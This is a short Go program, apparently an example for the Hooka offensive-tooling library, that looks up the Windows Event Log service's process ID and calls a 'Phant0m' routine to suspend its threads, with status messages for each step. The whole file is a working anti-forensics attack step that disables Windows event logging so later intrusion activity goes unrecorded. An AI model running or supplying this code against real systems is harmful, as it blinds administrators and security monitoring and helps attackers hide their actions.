package main

import (
	"fmt"
	"github.com/irony0egoist/Hooka/pkg/hooka"
	"log"
)

func main() {
	fmt.Println("[*] Getting Event Log PID...")
	eventlog_pid, err := hooka.GetEventLogPid()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[+] Event Log PID:", eventlog_pid)

	fmt.Println("[*] Suspending EventLog threads...")
	err = hooka.Phant0m(eventlog_pid)
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println("[+] Success!")
}
